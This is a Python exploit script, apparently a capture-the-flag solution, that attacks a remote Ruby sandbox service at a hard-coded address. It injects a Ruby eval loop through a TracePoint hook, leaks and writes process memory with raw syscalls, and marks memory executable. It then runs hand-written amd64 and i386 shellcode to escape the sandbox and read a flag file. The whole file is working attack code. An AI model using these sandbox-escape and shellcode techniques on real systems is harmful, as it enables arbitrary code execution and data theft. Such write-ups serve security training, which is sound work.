from skel import *

me['r']['tube'] = lambda: remote(host='13.115.119.206', port=31337)

def make_payload():
    return r'x = TracePoint.trace(:raise) { x.disable; while 1; begin; print "next>"; puts eval(gets); puts "done"; rescue => e; puts "Error during processing: #{$!}";puts "Backtrace:\n\t#{e.backtrace.join("\n\t")}";end;end}; asdf'

s = tube()

def exe(code):
    s.sla('next>', code)
    s.ru(code+'\r\n')
    return s.ru('\r\ndone\r\n', drop=True)

def leak_data(addr, size):
    data = exe('syscall(1, 1, %d, %d)'%(addr, size))[:size]
    return data

def write_data(addr, data):
    sz = len(data)
    for i in range(0, len(data), sz):
        print i, len(data), '-'*10

    s.ru('next>')
    pay = 'syscall(0,0,%d,%d)'%(addr+i, len(data))
    s.sendline(pay)
    s.ru(pay+'\r\n')

    s.sendline(data)
    s.ru('done\r\n')

    s.sendline()
    s.ru('done\r\n')

def go():
    payload = make_payload()
    s.sla('real> ', payload)

    s.ru('next>')

    bo_addr = int(exe("Sandbox.__id__"))*2
    data = leak_data(bo_addr, 0x200)

    sandbox_addr = u64(data[0x128:0x130])-0x1c26b60

    exe('syscall(10, {}, {}, 7)'.format(sandbox_addr, 0x1000))

    sc = ('''
    mov rdi, 0x602000
    mov rsi, 0x2000
    xor rdx, rdx
    mov dl, 0x7
    xor rcx, rcx
    xor rbx, rbx
    xor r8, r8
    dec r8
    mov r10, 0x62
    xor rax, rax
    mov al, 9
    syscall

    mov esp, 0x603000
    xor ecx, ecx
    mov eax, 5
    int 0x80
    ''')
    ('''
    xor rax, rax
    xor rdi, rdi
    mov rsi, 0x602190
    mov rdx, 0x120
    syscall

    xor rsp, rsp
    mov esp, 0x602168
    push 0x602198

    mov esp, 0x60216c
    push 0x23

    mov esp, 0x602160


    retf
    ''')

    payload = asm(sc, os='linux', arch='amd64')

    context.arch = 'i386'

    write_data(sandbox_addr+0x7c0, payload)

    s.sendline("Sandbox.run")

    s.rr(0.5)

    sc = """
    mov ebx, 0x60228a
    xor ecx, ecx
    mov eax, 5
    int 0x80

    push eax
    pop ebx
    push 0x603000
    pop ecx
    push 0xff
    pop edx

    xor eax, eax
    inc eax
    inc eax
    inc eax
    int 0x80

    xor ebx,ebx
    inc ebx
    xor eax, eax
    inc eax
    inc eax
    inc eax
    inc eax
    int 0x80
    """
    shell = asm(sc, arch='x86')
    shell += '\x00' * ((0x280-0x190) - len(shell))
    shell += '/home/ruby/flag\x00'

    s.sendline("\x90"*10 + shell)

    s.interactive()

go()
